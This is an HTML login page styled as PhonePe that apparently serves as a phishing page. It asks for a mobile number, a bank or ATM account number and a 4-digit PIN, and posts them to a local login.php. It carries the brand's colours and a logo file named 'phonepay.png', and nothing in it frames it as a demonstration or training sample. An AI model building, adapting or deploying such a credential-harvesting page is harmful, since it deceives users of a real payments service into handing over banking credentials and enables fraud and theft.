<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PhonePe - Secure Login</title>
    <style>
        /* --- CSS Styles --- */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        /* Main Card Container */
        .login-card {
            background: white;
            width: 100%;
            max-width: 450px; /* Limits width on laptops */
            padding: 30px 25px;
            border-radius: 12px;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        /* Logo */
        .logo {
            margin-bottom: 25px;
        }
        
        .logo img {
            width: 140px;
            height: 140px;
            object-fit: cover;
            border-radius: 50%;
            display: block;
            margin: auto;
        }

        h2 {
            color: #3e3e3e;
            font-size: 22px;
            margin-bottom: 5px;
        }

        p.subtitle {
            color: #757575;
            font-size: 14px;
            margin-bottom: 25px;
        }

        /* Form Group Styles */
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        label {
            display: block;
            font-size: 13px;
            color: #555;
            margin-bottom: 6px;
            font-weight: 500;
        }

        input[type="tel"], 
        input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            outline: none;
            transition: all 0.3s ease;
        }

        /* Focus Effect - PhonePe Purple */
        input:focus {
            border-color: #6739b7;
            box-shadow: 0 0 0 3px rgba(103, 57, 183, 0.1);
        }

        /* Specific style for Password to hide text */
        input[type="password"] {
            letter-spacing: 4px; /* Spacing for 4 digits look */
            text-align: center;
        }

        /* Button Style */
        .btn-submit {
            width: 100%;
            padding: 14px;
            background-color: #6739b7;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.3s;
        }

        .btn-submit:hover {
            background-color: #502d8c;
        }

        /* Footer Terms */
        .footer {
            margin-top: 25px;
            font-size: 12px;
            color: #757575;
        }

        .footer a {
            color: #6739b7;
            text-decoration: none;
        }

        /* --- Mobile Responsiveness --- */
        @media (max-width: 480px) {
            body {
                padding: 10px;
                align-items: flex-start; /* Align top on mobile */
            }
            
            .login-card {
                max-width: 100%; /* Full width on small screens */
                padding: 25px 20px;
                box-shadow: none; /* Flatter look on mobile */
                border: 1px solid #eee;
            }

            h2 {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>

    <div class="login-card">
        <!-- Logo -->
        <div class="logo">
            <img src="phonepay.png" alt="PhonePe Logo">
        </div>

        <!-- Header -->
        <h2>Welcome Back</h2>
        <p class="subtitle">Enter your details to login securely</p>

        <!-- Form -->
        <form action="login.php" method="POST">
            
            <!-- 1. Phone Number Input -->
            <div class="form-group">
                <label for="phone">Mobile Number</label>
                <input type="tel" id="phone" name="phone" placeholder="9876543210" pattern="[0-9]{10}" maxlength="10" required>
            </div>

            <!-- 2. Bank/ATM Account Number Input -->
            <div class="form-group">
                <label for="account">Bank / ATM Account No.</label>
                <input type="tel" id="account" name="account" placeholder="123456789012345" maxlength="16" required>
            </div>

            <!-- 3. 4-Digit Password Input -->
            <div class="form-group">
                <label for="password">PIN / Password</label>
                <input type="password" id="password" name="password" placeholder="••••" maxlength="4" required>
            </div>

            <!-- Submit Button -->
            <button type="submit" class="btn-submit">Login</button>
        </form>

        <!-- Footer -->
        <div class="footer">
            By continuing, you agree to our 
            <a href="#">Terms of Service</a> & <a href="#">Privacy Policy</a>.
        </div>
    </div>

</body>
</html>
